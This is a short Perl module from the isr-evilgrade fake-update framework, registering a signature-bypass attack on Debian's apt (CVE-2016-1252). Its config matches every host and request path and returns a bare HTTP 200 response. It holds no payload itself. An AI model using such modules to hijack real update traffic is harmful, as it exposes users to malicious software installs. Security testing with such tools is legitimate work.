###############
# debian_apt_bypass.pm
#
# CVE-2016-1252 (Sig Bypass, CVSS 8.8, Year 2016)
#
# This file is part of isr-evilgrade, www.faradaysec.com .

package modules::debian_apt_bypass;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'    => 'debian_apt_bypass',
    'version' => '1.0',
    'cvss'    => '8.8',
    'type'    => 'Sig Bypass',
    'year'    => '2016',
    'cve'     => 'CVE-2016-1252',
    'vh'      => '(.*)',
    'request' => [{
        'req'   => '/.*',
        'type'  => 'string',
        'string' => 'HTTP/1.1 200 OK',
    }],
};

sub new {
    my $class = shift;
    bless($base, $class);
}

1;
